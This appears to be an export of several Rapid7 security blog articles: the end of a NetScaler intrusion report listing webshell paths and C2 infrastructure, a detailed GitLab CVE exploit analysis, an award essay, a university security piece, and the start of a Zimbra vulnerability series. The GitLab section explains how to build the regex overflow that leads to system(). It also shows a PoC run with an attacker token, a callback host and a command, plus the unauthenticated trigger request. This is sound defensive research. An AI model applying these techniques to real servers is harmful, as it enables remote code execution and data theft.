+/var/tmp/.s2loot/
+
+Loot staging directory
+
+/var/tmp/.ux/slapshot.py
+
+Python HTTP tunnel/session manager component
+
+/var/tmp/.ux/whipd.py
+
+Python HTTP tunnel front-end component
+
+/tmp/.uxdlock
+
+Process coordination lock file
+
+/tmp/.uxdport
+
+Ephemeral loopback port recording file
+
+/var/netscaler/logon/LogonPoint/custom/.slap.receiver
+
+webshell
+
+/var/netscaler/logon/LogonPoint/custom/.ctxs.receiver
+
+webshell
+
+/var/netscaler/logon/LogonPoint/custom/receiver.deb
+
+webshell
+
+/nsconfig/.slap/.slap.receiver
+
+Backup webshell copy
+
+/nsconfig/.slap/.ctxs.receiver
+
+Backup webshell copy
+
+/nsconfig/.slap/receiver.deb
+
+Backup webshell copy
+
+Table 2: Malicious files and filesystem paths
+
+SHA-256
+
+Filename
+
+6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44
+
+1.sh
+
+a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556
+
+17447d.sh
+
+56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186
+
+2.sh / r.sh
+
+8e8b9532ce40eacfe1b4cf2b11241878b70b910aabd90b453b1460df19b51a4d
+
+scanner-freebsd-amd64
+
+eaf0086237879bbaac00a5874c0e2ff84deede1ba10e6b706e2288fd3a31cdde
+
+vc
+
+ffe052fc50271e7739d458b155df790438776032bfd125b974735e1dd9c0b138
+
+nsvmd
+
+Table 3: SHA-256 file hashes
+
+Indicator
+
+Notes
+
+v5v.in
+
+C2 domain used by nsvmd
+
+209.74.64.192
+
+C2 used by nsvmd
+
+192.159.99.139
+
+.slap C2, relay, reverse-agent and loot-upload infrastructure
+
+213.209.159.55
+
+Stage server used to deliver /v, 1.sh/17447d.sh, and collect staged data
+
+179.60.146.241
+
+IP serving 1.sh
+
+45.92.1.17
+
+stage/loot infrastructure on port 30444
+
+62.133.62.80
+
+Payload delivery
+
+46.151.182.18
+
+Payload delivery
+
+132.243.166.140
+
+Payload delivery
+
+199.233.217.13
+
+Payload delivery
+
+31.56.197.72
+
+Payload delivery
+
+64.94.85.67
+
+Payload delivery
+
+130.94.20.222
+
+Payload delivery
+
+173.231.39.244
+
+Payload delivery
+
+Table 4: Network indicators of compromise
+
+Rapid7 customers
+
+YARA rules and more IoCs are available in Rapid7’s Intelligence Hub along with ongoing intelligence on the latest campaigns.
+
+Defensive recommendations
+
+Patch NetScaler appliances to the applicable CVE-2026-88779 and CVE-2026-88771 fixed builds and verify the earlier CTX697096 fixes.
+
+Treat Internet-facing appliances as potentially compromised if they were vulnerable during the campaign window.
+
+Collect volatile evidence before rebooting or rebuilding when compromise is suspected.
+
+Inspect both nodes of every HA pair.
+
+Hunt for the .slap, .relay and .nsvm paths.
+
+Hunt for setuid /bin/sh, unauthorized Apache PHP handlers and CSS-looking aliases.
+
+Search for nsaaad crashes, Pitboss reboots and ns_monuploadd_err.pl execution records.
+
+Rotate all credentials and keys exposed through /nsconfig, including LDAP/RADIUS credentials and encryption-related material.
+
+Review outbound traffic for the listed infrastructure and internal scanning from NetScaler source addresses.
+
+Conclusion
+
+This incident demonstrates how a NetScaler compromise can evolve from a pre-authentication injection into a persistent appliance-resident intrusion platform. The attacker combined web shells, setuid privilege persistence, outbound command execution, internal TCP tunnelling, HA manipulation, environment reconnaissance and automated configuration exfiltration.
+
+The most significant new findings are the observed chaining of CVE-2026-88779 and CVE-2026-88771 and the dedicated reconnaissance workflow. Rather than using the ADC only as a foothold, the operator used it as a privileged vantage point to map internal networks, identity services, management infrastructure and virtualization systems. This provides defenders with additional high-value hunting opportunities and shows why patching alone is insufficient after an Internet-facing NetScaler has been exposed to active exploitation.
+
+Additional resources
+
+https://www.cve.org/CVERecord?id=CVE-2026-88771
+
+https://www.cve.org/CVERecord?id=CVE-2026-88779
+
+https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772/
+
+https://www.cisa.gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway
+
+https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/"
+8163e676da55,8163e676da55,2026-10-16 13:31 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,Code Security; Vulnerability Management,Article,Rapid7 Analysis: GitLab CI/CD Regex Integer Overflow (CVE-2026-97229),https://www.rapid7.com/blog/post/ra-gitlab-ci-cd-regex-integer-overflow-technical-analysis-cve-2026-97229,It begins after an attacker has pushed both the malicious CI configuration and a specially named path to a public project; only the final CI lint request is unauthenticated,"Overview
+
+On October 12, 2026, GitLab released 19.4.2, 19.3.5, and 19.2.8 to fix CVE-2026-97229, an integer overflow in its CI/CD regular-expression handling. The issue was reported through HackerOne by joaxcar. GitLab assigned it a CVSS score of 10.0 and described possible code execution by an unauthenticated user.
+
+The advisory states that CVE-2026-97229 affects GitLab CE and EE from 19.2 before 19.2.8, 19.3 before 19.3.5, and 19.4 before 19.4.2. GitLab says all deployment types are affected unless stated otherwise. GitLab.com was patched before disclosure, and Dedicated customers do not need to act.
+
+Rapid7 researchers developed an end-to-end PoC that reliably runs arbitrary commands as GitLab's git operating-system account on the official Linux amd64 gitlab/gitlab-ce:19.4.1-ce.0 image with ASLR enabled. GitLab's release notes do not report exploitation in the wild occurring at the time of disclosure.
+
+This analysis covers one end-to-end route. It begins after an attacker has pushed both the malicious CI configuration and a specially named path to a public project; only the final CI lint request is unauthenticated. That prerequisite conflicts with GitLab's PR:N rating, and because the underlying report remains private, we do not yet know how the reported attack avoids it.
+
+Technical analysis
+
+At a high level, the chain crosses from attacker-controlled repository input into Onigmo pcode and finally native code execution.
+
+Figure 1: From repository inputs to command execution.
+
+CI rules pass repository paths to Onigmo
+
+GitLab supports regular-expression matching over repository paths in rules:exists:regexp and rules:changes:regexp. One way to evaluate such an expression during static configuration processing is to place it on a conditional include:
+
+include: - local: /benign.yml rules: - exists: regexp: ""ATTACKER_PATTERN""
+
+RegexpMatcher expands the expression, compiles it with Ruby's native regular-expression engine, and tests it against paths from the selected Git worktree:
+
+# Exists#regexp_match?() def regexp_match?(context) matcher = regexp_matcher(context) matcher.validate_pattern_length! # [0] Source-length check Gitlab::SafeRequestStore.fetch(regexp_comparison_key(context, matcher.expanded_pattern)) do # ... top-level optimisation omitted matcher.match?(worktree_paths(context, false)) # [1] Repository paths end end # RegexpMatcher#match?() def match?(paths) # ... path-count fail-open handling omitted pattern = compile_pattern # [2] Compile regexp deadline = current_monotonic_time + REGEXP_TOTAL_TIMEOUT_SECONDS paths.any? do |path| # ... total-budget check omitted pattern.match?(path) # [3] Native match # ... per-match timeout handling omitted end end
+
+By the time execution reaches [0], GitLab is checking only the length of the expanded source expression. The call at [1] supplies every filename in the selected commit, while compile_pattern at [2] ultimately invokes Regexp.new. Each iteration at [3] therefore crosses from CI configuration into native Onigmo with a repository path as the match subject.
+
+Smuggling a large repeat through the checks
+
+GitLab places several sensible limits around CI regular expressions. The interesting parts of its wrapper are shown below:
+
+REPEAT_BOUND = /(?<!\\)(?:\\\\)*\{\s*(\d+)\s*(?:,\s*(\d+)?\s*)?\}/ # [4] Repeat scanner def self.compile_regexp(pattern, timeout: nil) raise RegexpError, 'uses a subroutine call (\g), which is not allowed' if SUBROUTINE_CALL.match?(pattern) # [5] Subroutine-call check reject_large_repeats!(pattern) # [6] Repeat-bound check alternation_free = pattern.gsub(ESCAPE_OR_ALTERNATION) { |token| token == '|' ? '\\|' : token } probe = begin Regexp.new(alternation_free) rescue RegexpError => e # ... error-message rewriting omitted end check_compiled_size!(probe) # [7] Probe size check check_compiled_size!(Regexp.new(pattern, timeout: timeout)) # [8] Final size check end
+
+The source-length check occurs before this function. The subroutine-call check at [5] and the repeat-bound check at [6] defend against structural growth, but the scanner at [4] recognizes only contiguous digits. Compilation then happens twice: [7] checks an alternation-free probe, and [8] checks the requested expression and attaches the 50-millisecond timeout. Either object is rejected if it exceeds one megabyte.
+
+The PoC hides its quantifier bound from the scanner at [4] via an inline comment: {5(?#)7805}
+
+(?#) is an inline regex comment. Onigmo ignores it and reads the bound as 57,805. GitLab's scanner expects contiguous digits, so it does not see a bound above 1,000.
+
+That bypass admits the large repeat, but the checked expression is still only 986 bytes. The six [[:word:]] classes expand when matching begins against a repository path containing valid four-byte UTF-8 characters. Ruby recompiles the same source for UTF-8, each POSIX word class expands into a large Unicode range table, and GitLab never checks the size of this new program.
+
+Ruby selects or recompiles the regex before starting its timed matcher:
+
+/* re.c: rb_reg_prepare_re() */ regex_t *reg = RREGEXP_PTR(re); if (reg->enc == enc) return reg; // [9] Matching encoding // ... source preprocessing and use-count branch omitted r = onig_new_without_alloc(&tmp_reg, (UChar *)ptr, (UChar *)(ptr + len), reg->options, enc, OnigDefaultSyntax, &einfo); // [10] Onigmo recompile // ... error handling and old-program replacement omitted /* re.c: rb_reg_onig_match() */ reg = rb_reg_prepare_re(re, str); // ... use-count bookkeeping omitted OnigPosition result = match(reg, str, regs, args); // [11] Begin timed match // ... result cleanup omitted
+
+At [9], Ruby returns the existing program only when its encoding matches the subject. Otherwise, [10] recompiles the source for the subject encoding via Onigmo. Only then does [11] begin timed matching, leaving the unsafe compilation outside the timeout.
+
+Onigmo compiles the regular expression into bytecode, which its source calls pcode. Its regex VM then runs that pcode against each path, so the UTF-8 recompilation at [10] is where the oversized pcode program is created.
+
+The repeated target also carries the bytes that run after the overflow:
+
+# poc.py: build() # ... prefix setup omitted target = ""(?<="" + ""[[:word:]]"" * 6 + """".join(character_class(stage) for stage in STAGES) digits = str(REPEAT_COUNT) pattern = f""\\A(?>{prefix}(?:{target}){{{digits[0]}(?#){digits[1:]}}}|)\\b\\B""
+
+The six [[:word:]] classes are only the size multiplier. The payload sits in four more character classes generated by character_class(stage). A class such as [abc] compiles to a bitmap with bits set for a, b, and c. The helper works backwards from each desired pcode sequence and chooses class members whose bitmap reproduces those bytes. This puts attacker-controlled VM instructions at the end of every expanded copy.
+
+Crossing INT_MAX
+
+Under UTF-8, one copy of the repeated body is 37,151 bytes. The relevant Onigmo compiler code in Ruby 3.3.12 is:
+
+/* regcomp.c: compile_quantifier_node() */ /* ... earlier quantifier cases omitted */ else if (!infinite && qn->greedy && (qn->upper == 1 || (tlen + SIZE_OP_PUSH) * qn->upper <= QUANTIFIER_EXPAND_LIMIT_SIZE)) { // [12] Signed size check int n = qn->upper - qn->lower; r = compile_tree_n_times(qn->target, qn->lower, reg); // [13] Expand lower copies if (r) return r; // ... optional copies omitted } /* ... remaining quantifier cases omitted */
+
+With this body size (37,151) and quantifier bound (57,805):
+
+37,151 × 57,805 = 2,147,513,555 = 0x800074d3
+
+That is 29,908 (0x74D4) bytes beyond signed INT_MAX (0x7FFFFFFF). At [12], the negative result satisfies the compiler's “small enough to expand” test. Onigmo enters the expansion path at [13] and emits all 57,805 copies.
+
+The | immediately after {5(?#)7805} makes the repeated body the first alternative and leaves the second alternative empty. Onigmo compiles this | into two pcode branches. An OP_PUSH near the beginning is meant to record the empty alternative as a backtracking target, but does not transfer execution on this path. The first bad transfer is the OP_JUMP emitted after the giant first alternative by the alternation compiler:
+
+/* regcomp.c: compile_tree(), NT_ALT */ /* ... calculate alternation length omitted */ pos = reg->used + len; /* goal position */ /* ... emit the fallback and first alternative omitted */ if (IS_NOT_NULL(NCDR(node))) { len = pos - (reg->used + SIZE_OP_JUMP); r = add_opcode_rel_addr(reg, OP_JUMP, len); // [14] Skip empty branch if (r) break; }
+
+The jump at [14] should skip the empty alternative and land at the end of the alternation. The compiler calculated pos from the already wrapped length, however. Our build emits the jump at offset 2,147,513,698 with a displacement of -136, sending execution into the first payload bitmap in the last expanded copy, 140 bytes from the end of the pcode.
+
+From character-class bitmap to system()
+
+The wrapped branch now leaves normal generated pcode and enters a controlled character-class bitmap. Onigmo consequently runs the bytes encoded by character_class() as VM instructions, starting the sequence shown here.
+
+Figure 2: From controlled Onigmo pcode to native command execution.
+
+The controlled pcode redirects Onigmo's backtracking stack, which holds saved match state, into the repository path. On a failed match, the VM restores the two values shown in the diagram: the next instruction from the path and FinishCode, a pointer from its bottom stack frame. The first value decides where controlled pcode resumes. The second gives it a known address inside libruby.
+
+The path instruction sends control to the final controlled bitmap. That bitmap adjusts the recovered libruby pointer to a short instruction sequence that passes the path command to system(), then writes that address into match_at()'s native return slot. When the matcher finishes, execution returns through the overwritten slot. FinishCode and the call site are in the same libruby mapping, so the distance between them stays constant under ASLR.
+
+Exploitation
+
+Delivering the branch through CI lint
+
+Once the malicious configuration and path are present on a public branch, GitLab's CI lint API supplies an unauthenticated trigger. The GET form accepts an attacker-selected content_ref, loads .gitlab-ci.yml from that commit, and evaluates it:
+
+GET /api/v4/projects/attacker%2Fpublic-project/ci/lint?content_ref=payload-ref Host: gitlab.example
+
+The route checks whether the requester may read the public repository, resolves the supplied ref, and passes its CI configuration to the static linter:
+
+get ':id/ci/lint' do authorize_read_code! # [17] Read authorization not_found! 'Repository' if user_project.empty_repo? unauthorized!(""This endpoint requires an API authentication"") if current_user && !::Current.token_info # [18] Token check content_ref = params[:content_ref] || params[:sha] || user_project.repository.root_ref_sha # [19] Select commit dry_run_ref = params[:dry_run_ref] || params[:ref] || user_project.default_branch commit = user_project.commit(content_ref) not_found! 'Commit' unless commit.present? content = user_project.repository.blob_data_at(commit.sha, user_project.ci_config_path_or_default) result = Gitlab::Ci::Lint .new(project: user_project, current_user: current_user, sha: commit.sha) .legacy_validate(content, dry_run: params[:dry_run], ref: dry_run_ref) # [20] Run static lint present result, with: Entities::Ci::Lint::Result, current_user: current_user, include_jobs: params[:include_jobs] end
+
+Public visibility makes authorize_read_code! at [17] succeed without credentials, while the condition at [18] does not reject an absent current_user. The selected branch becomes the static linter's input through [19] and [20], without creating a pipeline or contacting a runner. This is why the exploit's trigger can be unauthenticated even though the demonstrated setup requires project write access.
+
+Running a command
+
+The initial Python PoC clones a public project controlled by the operator, creates a payload branch, starts the callback, and sends the lint request:
+
+$ python3 poc.py https://g.example 123 \ --git-url 'https://oauth2:ATTACKER_TOKEN@g.example/attacker/public-poc.git' \ --callback-url cb.ex:8000 \ --cmd 'uname -a && id' [*] deployed attacker ref 69fe2478c446ab17afe4c150; executing: uname -a && id [*] delivery GET https://g.example/api/v4/projects/123/ci/lint?content_ref=69fe2478c446ab17afe4c150 [*] target stopped responding after delivery: HTTP Error 502: Bad Gateway [uname output omitted] uid=998(git) gid=998(git) groups=998(git)
+
+HTTP 502 is expected. The command runs synchronously in a Puma worker. After system() returns, the corrupted worker crashes. GitLab Workhorse, the reverse proxy in front of Puma, sees its Rails backend connection close and returns 502. Puma replaces the worker. The callback output, not the HTTP status, is the success signal.
+
+The target-specific values in this PoC, such as SYSTEM_STEP_COUNT, the number of UTF-8 backward steps from FinishCode to the libruby system() call site, match official GitLab CE 19.4.1 on Linux amd64. Other vulnerable packages or architectures need adjusted pcode and libruby offsets. A little over 2 GiB is required in the worker, and our complete single-node GitLab target needed about 9 GiB available. Low-memory instances may swap, reject the allocation, or invoke the OOM killer.
+
+The fix
+
+GitLab's Ruby backport replaces the multiplication at [12] with a division-based test, which cannot overflow, and rejects compiled programs above roughly 512 MiB:
+
+/* regcomp.c */ #define IS_EXPAND_LIMIT_OK(tlen, n) \ ((n) <= 0 || (tlen) <= QUANTIFIER_EXPAND_LIMIT_SIZE / (n)) /* ... unrelated compiler declarations omitted */ #define MAX_COMPILED_PROGRAM_SIZE (INT_MAX_LIMIT / 4)
+
+On the patched image, the crafted quantifier remains a compact loop and the request returns a normal false match. The repeat-range double-free fixed in the same release affects an error path and is not part of this chain.
+
+Detection guidance
+
+For the exploitation strategy described in this analysis, correlate:
+
+/var/log/gitlab/gitlab-workhorse/current: a several-second GET /api/v4/projects/<project>/ci/lint?content_ref=<ref>, badgateway: failed to receive response: EOF, and HTTP 502.
+
+A Puma worker crashes or restarts at the same time; any saved trace contains regexp_matcher.rb.
+
+The referenced commit: an (?#)-split repeat, repeated POSIX word classes, and a path containing four-byte UTF-8 characters.
+
+A shell child or roughly 2 GiB worker-memory increase strengthens the match. The undisclosed path may differ.
+
+Mitigation guidance
+
+Self-managed GitLab customers should upgrade to the fixed patch for their release: 19.2.8, 19.3.5, or 19.4.2. As a temporary measure, restrict credential-free access to attacker-writable public projects or block this lint route. Route controls do not repair the vulnerable Ruby compiler.
+
+Please read GitLab's critical patch release for the latest guidance."
+a690315b0f0a,a690315b0f0a,2026-10-16 13:00 UTC,General Security News,Rapid7,Rapid7 Blog,Endpoint Security,Article,Rapid7 Intelligence Wins the 2026 Péter Szőr Award for Outstanding Research,https://www.rapid7.com/blog/post/tr-rapid7-intelligence-wins-2026-peter-szor-award-outstanding-research,"This was back when malware analysis meant staring at assembly, arguing about what a routine really did, and realizing hours later that your first theory was wrong","Some awards you're happy to receive, while others make you stop for a moment. Receiving the 2026 Péter Szőr Award this week at Virus Bulletin in Seville for our research, BPFdoor in Telecom Networks: Sleeper Cells in the Backbone, was of the latter kind.
+
+Virus Bulletin created the award to honor Péter's life and work, and it recognizes outstanding technical security research: the rigorous, the deep, and the useful – exactly what he was known for himself. And as far as recognitions in our industry go, it's hard to top. I'm extremely proud.
+
+What the Pèter Szőr Award means to us
+
+I knew Péter, and early in my career, I learned from him. This was back when malware analysis meant staring at assembly, arguing about what a routine really did, and realizing hours later that your first theory was wrong. One memory came straight back when I heard about the award: going through Stuxnet together. For anyone in research at the time, that was the moment you knew the game had changed. Engineering, tradecraft, espionage and physical-world consequences, all in one package.
+
+What stayed with me wasn't how much Péter knew, but rather his curiosity. He wanted to understand things, and then once he did, he wanted everyone else to understand too. Plenty of brilliant people in cybersecurity keep it to themselves, but the ones who leave a legacy make the people around them better.
+
+Receiving an award that carries his name felt like one of those full-circle moments.
+
+The research behind the award
+
+The original research from Rapid7 Intelligence emerged after months of investigating stealthy access inside telecommunications environments. This wasn't malware dropped during a conventional intrusion, but long-term strategic positioning: passive backdoors, kernel-level capabilities and covert access, quietly settled into critical infrastructure and in no hurry whatsoever.
+
+Telecom networks carry our communications, our identities and, increasingly, everything governments and businesses run on. So when an adversary sets up camp there, the impact goes well beyond one compromised machine or one unlucky company.
+
+Virus Bulletin's community nomination noted that the work paired deep technical investigation with real-world impact, including long hours with agencies and CERTs around the world and tools, scripts, intelligence and detection capabilities for defenders. That's the part I'm happiest about, as this wasn't research for publication alone. Remember that a PDF has never stopped an intrusion.
+
+Publishing research is a checkpoint, not the finish line
+
+We're still doing the research. Since the original report, Rapid7 Intelligence has analyzed hundreds more samples, found previously undocumented BPFDoor variants, and tracked changes in the operators' tradecraft. Our follow-up work covered new httpShell and icmpShell variants built to make detection even harder. In further publications, we went beyond BPFDoor to additional Linux implants and infrastructure targeting telecom and network-edge environments, including AVERAT and techniques that hide in ordinary-looking traffic like SMTP.
+
+That's how this work goes. You find something, you share it, someone sends you another sample, a CERT spots something in their environment, an analyst notices the one odd function nobody looked at twice, and you're back down the rabbit hole. Anyone who thinks an initial report is the finish line has never received ""just one more sample"" at 4 p.m. on a Friday.
+
+And truthfully, I also love that this happens in the open. From the outside, our industry looks like a cage match over attribution, naming conventions and whose acronym is cooler. But when something truly matters, researchers, vendors, CERTs and governments put that aside and share, because protecting people beats winning the naming argument.
+
+This award belongs to the team: Rapid7 Intelligence
+
+Research like this never belongs to just one or two people. It belongs to the analysts still staring at code after everyone else has gone home, the people who question an assumption because something doesn't add up, the people that keep the show running, and the detection engineers who turn findings into something defenders can use. It also belongs to the people collecting samples, maintaining infrastructure and correlating intelligence, and to the CERTs, agencies and peers who trusted us enough to share what they saw.
+
+I'm proud of the Rapid7 Intelligence team, and not because of the trophy. I'm proud of why we got it: we took a hard problem, did the hard work, and then tried to make the result useful to someone else.
+
+To the next generation of research
+
+Today, the conversation has evolved to include autonomous agents, AI-generated malware and machine-speed attacks. Tomorrow it'll be something new. My motivation stays the same: I want to leave the digital world a little safer for the generations that come after us.
+
+Somewhere right now, a young researcher is opening a debugger for the first time and wondering how on earth the thing works. Someone will investigate the Stuxnet of their generation, and someone will eventually sit in the chair I'm in now. Our job isn't just to detect today's attacks. It's to share what we learn, build tools, mentor people and make sure they start a few steps ahead of where we did.
+
+Péter did that for our industry, and he did it for me.
+
+Thank you to Virus Bulletin and our peers in the security community for this recognition, to everyone who contributed to the research, publicly or behind the scenes, and to Péter, who taught a young malware researcher that taking things apart is only half the job. The other half is making sure somebody else can learn from what you found."
+59af860a9b8a,59af860a9b8a,2026-10-15 19:20 UTC,General Security News,Rapid7,Rapid7 Blog,Attack Surface Discovery; Compliance Management; Vulnerability Management,Article,How Multi-Campus Universities can Build a more Connected Security Program,https://www.rapid7.com/blog/post/it-multi-campus-universities-building-more-connected-security-programs,"First, the threat landscape: universities are dealing with more frequent attacks across complex, distributed environments, while campus-by-campus security can make it harder to...","Parts 1 and 2 of this series looked at two pressures facing higher education security teams. First, the threat landscape: universities are dealing with more frequent attacks across complex, distributed environments, while campus-by-campus security can make it harder to share intelligence and coordinate response. Second, the compliance burden: overlapping requirements across FERPA, GLBA, HIPAA, and CMMC make it difficult to establish what data was affected, which reporting obligations apply, and how quickly the institution needs to act.
+
+This final part is about what changes when a university system starts treating security as a shared capability rather than a collection of separate campus programs. Multi-campus institutions still need to preserve local autonomy, but they also need enough visibility across the wider organization to understand where risk sits, how an incident is spreading, and whether the same problem is appearing elsewhere.
+
+That balance is especially relevant in higher education, where campuses, research environments, health services, and administrative teams often operate with very different technology needs and levels of independence.
+
+Security architecture should reflect how universities actually operate
+
+Most university systems are already federated organizations, with individual campuses managing their own leadership, budgets, users, and technology environments while a central office provides governance and oversight across the wider institution.
+
+Security architecture can follow the same model. With multi-tenancy in the Rapid7 Command Platform, a central security team can maintain visibility across the university system while individual campuses continue to operate within their own environments. Campus-level data and access remain separated, while the central team can identify wider patterns, coordinate response, and distribute common workflows across the system.
+
+A new attack pattern detected at one campus, for example, should not have to remain a local discovery. Shared visibility and coordinated workflows can help the central team determine whether the same activity is appearing elsewhere and make relevant response guidance available across the institution without exposing one campus's data to another.
+
+As the university system grows, that model can expand with it. A system operating three campuses today can add new environments without redesigning the security architecture each time.
+
+Shared visibility makes cross-campus response faster
+
+A central view of the attack surface can reduce much of the manual work that happens when university teams need to answer a system-wide security question.
+
+If a significant zero-day is disclosed, the central security team needs to know which campuses are running affected systems, which have already remediated the vulnerability, and where attention is still required. In a decentralized environment, gathering that information can mean emails, calls, spreadsheets, and separate conversations with each campus. A shared view of assets and vulnerabilities gives teams a faster way to establish where the exposure exists.
+
+During an active incident, the same cross-campus visibility can help investigators work out whether suspicious activity first appeared at Campus C because the compromise began there, or because that is simply where it became visible. It also allows them to check whether the same indicators are present at Campus A or Campus B before each team starts investigating independently.
+
+Universities also have large external attack surfaces that can be difficult to inventory centrally. Student portals, APIs, research servers, faculty websites, and other internet-facing assets may be created outside normal IT processes. Rapid7's Project Sonar continuously scans the public internet, helping organizations identify externally exposed services and assets that internal inventories may have missed.
+
+Vulnerability prioritization needs more than a severity score
+
+University security teams rarely have the capacity to remediate every vulnerability at once, so prioritization has to reflect how likely an exposure is to be used in a real attack.
+
+Rapid7 combines vulnerability data with attacker intelligence, including insight from Metasploit, our open source penetration testing framework used by security professionals to test and validate real-world exploits, with more than 3,000 exploit modules.
+
+That intelligence is combined with insight from AttackerKB, incident response engagements, honeypots, and other threat intelligence sources, giving teams additional context around whether an exploit exists, whether exploitation has been observed, and how difficult a vulnerability may be to use in practice.
+
+For a university working through thousands of findings across multiple campuses, that context can help teams direct limited remediation capacity toward exposures with stronger evidence of attacker interest rather than relying on severity scores alone.
+
+Incident response has to work across campus boundaries
+
+The compliance requirements discussed in Part 2 put added pressure on investigation speed, particularly when legal or compliance teams need to establish whether regulated student, financial, health, or research data was accessed across more than one campus.
+
+Rapid7's open source Velociraptor platform can collect forensic artifacts and run live investigations across thousands of endpoints simultaneously. In a multi-campus university, that could allow investigators to determine whether the same activity or data access occurred across several environments without conducting each investigation separately.
+
+Automated response workflows can also be distributed across affected campus environments, allowing teams to isolate compromised systems, revoke credentials, or block indicators consistently rather than repeating the same response manually at each institution.
+
+Campuses with smaller security teams benefit from that shared capability because the quality and speed of response are less dependent on how many people happen to be available locally when an incident occurs.
+
+Consolidation can return time to stretched security teams
+
+The operational case for a shared security model also comes down to the amount of work created by fragmentation. Separate campus tools mean separate licenses, integrations, training requirements, renewals, reporting processes, and vendor relationships, all of which consume time that understaffed security teams could be spending elsewhere.
+
+The source material for this series includes an example of one organization recovering 96 hours per month by reducing manual work across disparate security tools. It also cites an average 74% improvement in mean time to detect where unified visibility and threat correlation were applied. For higher education teams working within tight regulatory reporting windows, the difference between finding an incident in hours rather than days can have a direct impact on how quickly the institution can assess scope and respond.
+
+A system-wide agreement can also reduce the number of contracts, renewal cycles, and vendor relationships that central and campus teams need to manage, while allowing security capabilities to scale as the institution adds campuses, devices, and cloud services.
+
+Building security around the university as a whole
+
+Multi-campus universities will always have different technology needs across individual campuses, research environments, health services, and administrative functions. A connected security model does not require those environments to operate identically, but it does give central and local teams a better way to understand shared risk, coordinate investigations, and apply consistent response when an issue extends beyond a single campus.
+
+Across this series, the same pattern has appeared from different angles. Threats move across organizational boundaries, regulated data rarely sits neatly within one campus, and the people responsible for protecting university systems are already working with limited time and resources. Bringing more of that security context together can help teams respond faster, share intelligence more effectively, and reduce the manual work created by disconnected tools and processes.
+
+Rapid7 helps more than 11,000 organizations worldwide take command of their security. Learn more at rapid7.com/sled."
+5e7ee79a8d36,5e7ee79a8d36,2026-10-14 13:00 UTC,General Security News,Rapid7,Rapid7 Blog,Email and Collaboration Security; Identity Security Posture Management; Vulnerability Management,Article,From One Account to Every Mailbox: Breaking Zimbra's Identity Boundaries (Part 1),https://www.rapid7.com/blog/post/ve-breaking-zimbra-identity-boundaries-part-1,Email impersonation needs no optional feature: the attacker places a different local address in an authenticated request,"An enterprise mail server authenticates users, stores private communications, delivers recovery links, runs calendars, and sends mail that employees and other systems trust. Compromising it can therefore expose both email and the identities and workflows built around it.
+
+During a broader assessment of Zimbra Collaboration Suite (ZCS), Rapid7 reported more than 80 vulnerabilities spanning authentication, mailbox authorization, calendar processing, web clients, document services, and the host operating system. The affected components are being fixed on different schedules, so we are publishing the analysis in stages. An accompanying GitHub repository containing full write-ups and PoCs serves as a live technical tracker, and will be updated as further findings and fixes become public.
+
+This first article concentrates on five account-related vulnerabilities:
+
+CVE
+
+Finding
+
+Rapid7 CVSS
+
+Fixed release
+
+CVE-2026-93637
+
+GraphQL authentication rate-limit bypass
+
+3.7 Low
+
+No public fix listed
+
+CVE-2026-93635
+
+LDAP filter injection
+
+5.3 Medium
+
+No public fix listed
+
+CVE-2026-73571
+
+Email impersonation via SaveDraftRequest
+
+8.3 High
+
+ZCS 10.1.17
+
+CVE-2026-10631
+
+EWS cross-user mailbox access
+
+6.5 Medium
+
+ZCS 10.1.20
+
+CVE-2026-50055
+
+Sieve notify forwarding-restriction bypass
+
+6.5 Medium
+
+ZCS 10.1.20
+
+Part 2 will cover unauthenticated stored XSS paths in the Classic and Modern clients and what they can do with the recipient's session. A script can install the Sieve forwarding rule (CVE-2026-50055); another path preserves direct mailbox access after the original session expires or the victim changes their password. CVE-2026-73571 makes these attacks more credible by placing the message in the mailbox as any chosen local user.
+
+Parts 3 and 4 move through the document-service boundary from SSRF to code execution as zimbra, then cover multiple independent paths from zimbra to root. The BruCON presentation, Signed, Sealed, Compromised: Weaponizing Enterprise Mail Infrastructure, previewed these chains, including selected root-command output returned to the victim's browser after one message selection.
+
+Product description
+
+Zimbra Collaboration Suite is a self-hosted platform for email, calendars, contacts, tasks, and file sharing. Zimbra calls its commercial server Network Edition. Within one Network Edition installation, customers can license a mixture of Standard and Professional users. Zimbra Desktop and Zimbra Connector for Outlook are separate client applications, while Exchange Web Services (EWS) is a separately licensed server feature for Outlook compatibility.
+
+ZCS includes two webmail clients with different request and rendering stacks: Classic relies primarily on SOAP, while Modern uses GraphQL. The server also accepts SMTP and iCalendar input, exposes compatibility services such as EWS, and delegates work to local components running under several operating-system identities.
+
+Testing setup
+
+Rapid7 initially assessed ZCS 10.1.16_GA_4850 Network Edition on Ubuntu 22.04. For fixed findings, each section describes Zimbra's fix and the accompanying Github repository retains the complete vulnerable-to-fixed diff.
+
+Impact
+
+The pre-authentication findings lower separate barriers to obtaining a foothold. GraphQL hides failed password attempts from Zimbra's source-IP counter. In the configured external-LDAP case, a second flaw can also leave the optional account-lockout policy with no local account to lock.
+
+Each remaining finding is independently exploitable from an ordinary compromised account. Email impersonation needs no optional feature: the attacker places a different local address in an authenticated request. Zimbra submits the message from that account through the trusted outbound pipeline and records a copy in the selected user's Sent folder.
+
+If EWS is enabled for the compromised account, the attacker can read private conversations, attachments, drafts, sent mail, contacts and calendar entries from other users' mailboxes. A separate Sieve policy bypass can keep copies of future mail flowing to the attacker after the original session expires or the password changes.
+
+These examples do not represent everything an attacker can do with authenticated Zimbra access, or the full vulnerability set from the assessment.
+
+GraphQL authentication rate-limit bypass (CVE-2026-93637)
+
+This pre-authentication route requires only HTTPS access to Zimbra. ZimbraInvalidLoginFilter normally records failed logins by source address around requests to the public service endpoints. Classic submits login attempts through the SOAP AuthRequest path, whereas Modern exposes the same password check through its GraphQL authenticate mutation.
+
+That limiter's failure threshold is 10 by default, and after a source crosses it within the configured window, subsequent requests handled by the filter receive HTTP 503. CVE-2026-93637 allows attempts through GraphQL to remain invisible to that counter.
+
+Technical analysis
+
+The failure counter relies on a request attribute
+
+ZimbraInvalidLoginFilter wraps requests to the public service endpoints and runs the downstream handler before its counter logic:
+
